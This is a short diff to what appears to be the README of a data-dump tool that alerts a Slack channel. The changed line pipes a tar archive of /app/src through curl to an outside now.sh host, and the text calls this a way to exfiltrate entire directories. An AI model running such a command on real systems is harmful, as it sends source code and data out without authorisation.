@@ -35,6 +35,6 @@ This will upload the file and alert the channel in Slack with the file
 It's also possible to upload with curl from  `stdin`, so you can chain commands together and exfiltrate entire directories using tar:
 
 ```
-$ tar cvzf - /app/src | curl --data-binary @- https://datadump-slack-ogfklyqrmv.now.sh/app_src123.tar.gz
+$ tar czf - /app/src | curl --data-binary @- https://datadump-slack-ogfklyqrmv.now.sh/app_src123.tar.gz
 ```
 ![slacK_tarball_dump](../imgs/slack_tarball_dump.png)
